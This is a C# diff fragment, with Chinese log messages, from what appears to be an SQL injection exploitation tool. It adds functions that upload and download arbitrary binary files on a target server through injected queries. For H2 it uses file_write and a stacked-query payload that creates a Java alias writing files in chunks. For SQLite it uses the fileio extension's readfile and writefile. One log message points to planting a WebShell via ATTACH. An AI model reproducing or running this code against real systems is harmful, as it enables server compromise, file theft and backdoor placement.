+                || config.DataConfig.SelectedInjectType.Equals(InjectType.Time)
+                || config.DataConfig.SelectedInjectType.Equals(InjectType.Dns))
+            {
+                Log.Warning("H2二进制上传为副作用表达式，盲注/时间/DNS通道会多次求值，请用Union/报错/堆叠通道！");
+                return;
+            }
+            string pathEnc = Enc(vm.FilePath);
+            int chunkSize = UploadChunkSize(config, 4000);
+            if (data.Length <= chunkSize)
+            {
+                //单发：file_write返回写入字节数，天然写后验证
+                Log.Show("FILE_WRITE二进制上传（" + data.Length + "字节）……");
+                string written = await FetchScalar(config, "file_write(x'" + Convert.ToHexString(data) + "'," + pathEnc + ")").ConfigureAwait(false);
+                if (int.TryParse(written, out int w) && w == data.Length)
+                {
+                    Log.Success("二进制上传验证通过：远端写入 " + w + " 字节，与本地一致！");
+                }
+                else
+                {
+                    Log.Warning("写后验证未通过（file_write返回=" + (written ?? "无") + "，本地=" + data.Length + "）！可能原因：非admin权限/目录不可写。");
+                }
+                return;
+            }
+            //大文件：CREATE ALIAS SQFW 分片append（与SQX同前提：JDK编译器）
+            int chunks = (data.Length + chunkSize - 1) / chunkSize;
+            Log.Show("CREATE ALIAS分片二进制上传（" + data.Length + "字节，" + chunks + "片×" + chunkSize + "字节）……");
+            string javaSrc = "String sqfw(String path, String hex, int append) throws Exception { java.io.FileOutputStream f = new java.io.FileOutputStream(path, append == 1); for (int i = 0; i + 1 < hex.length(); i += 2) { f.write(Integer.parseInt(hex.substring(i, i + 2), 16)); } f.close(); return \"OK\"; }";
+            await SendPayload(config, " 1=1;drop alias if exists SQFW;create alias SQFW as $$" + javaSrc + "$$;-- ").ConfigureAwait(false);
+            for (int i = 0; i < chunks; i++)
+            {
+                config.CheckStop();
+                int off = i * chunkSize;
+                int len = Math.Min(chunkSize, data.Length - off);
+                string result = await FetchScalar(config, "SQFW(" + pathEnc + ",'" + Convert.ToHexString(data, off, len) + "'," + (i == 0 ? 0 : 1) + ")").ConfigureAwait(false);
+                if (!(result ?? "").StartsWith("OK", StringComparison.Ordinal))
+                {
+                    Log.Warning("分片写入失败（" + (i + 1) + "/" + chunks + "）：" + result + "（需JDK编译器javax.tools可用）");
+                    return;
+                }
+                Log.SysLog("已上传分片 " + (i + 1) + "/" + chunks);
+            }
+            //写后验证：file_read长度比对
+            string lenStr = await FetchScalar(config, "length(file_read(" + pathEnc + "))").ConfigureAwait(false);
+            if (int.TryParse(lenStr, out int remoteLen) && remoteLen == data.Length)
+            {
+                Log.Success("二进制上传验证通过：远端文件 " + remoteLen + " 字节，与本地一致！");
+            }
+            else
+            {
+                Log.Warning("写后验证未通过（远端长度=" + (lenStr ?? "读取失败") + "，本地=" + data.Length + "），请人工检查！");
+            }
+        }
+
+        //---------- SQLite：fileio扩展 readfile/writefile（blob无损，仅加载该扩展的目标可用，如Calibre） ----------
+
+        /// <summary>SQLite 二进制下载：hex(readfile(path))——fileio扩展blob读取字节无损（无扩展时函数不存在，报错提示）</summary>
+        private static async Task BinaryDownloadSqlite(AppConfig config, FileCmdViewModel vm)
+        {
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            Log.Show("二进制下载：" + vm.FilePath + " ……（依赖目标加载fileio扩展的readfile()）");
+            string hex = await FetchHexString(config, "(hex(readfile('" + pathEsc + "')))", 64 * 1024 * 1024).ConfigureAwait(false);
+            FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：目标未加载fileio扩展（readfile函数不存在）/文件不存在/无读权限。");
+        }
+
+        /// <summary>SQLite 二进制上传：writefile(path,x'hex')单发（返回写入字节数直接验证；fileio扩展blob写入无损）</summary>
+        private static async Task BinaryUploadSqlite(AppConfig config, FileCmdViewModel vm)
+        {
+            byte[]? data = RequireUploadBytes(vm);
+            if (data == null)
+            {
+                return;
+            }
+            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Blind)
+                || config.DataConfig.SelectedInjectType.Equals(InjectType.Time)
+                || config.DataConfig.SelectedInjectType.Equals(InjectType.Dns))
+            {
+                Log.Warning("SQLite writefile为副作用表达式，盲注/时间/DNS通道会多次求值，请用Union/报错/堆叠通道！");
+                return;
+            }
+            int limit = UploadChunkSize(config, 4000);
+            if (data.Length > limit)
+            {
+                Log.Warning("writefile为整写函数无追加能力，本次" + data.Length + "字节超出单发上限" + limit + "字节，请精简文件或改用ATTACH写WebShell！");
+                return;
+            }
+            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
+            Log.Show("writefile二进制上传（" + data.Length + "字节）……（依赖目标加载fileio扩展）");
+            string written = await FetchScalar(config, "(writefile('" + pathEsc + "',x'" + Convert.ToHexString(data) + "'))").ConfigureAwait(false);
+            if (int.TryParse(written, out int w) && w == data.Length)
+            {
+                Log.Success("二进制上传验证通过：远端写入 " + w + " 字节，与本地一致！");
+            }
+            else
+            {
+                Log.Warning("写后验证未通过（writefile返回=" + (written ?? "无") + "，本地=" + data.Length + "）！可能原因：目标未加载fileio扩展/目录不可写。");
+            }
+        }
+
     }
 }
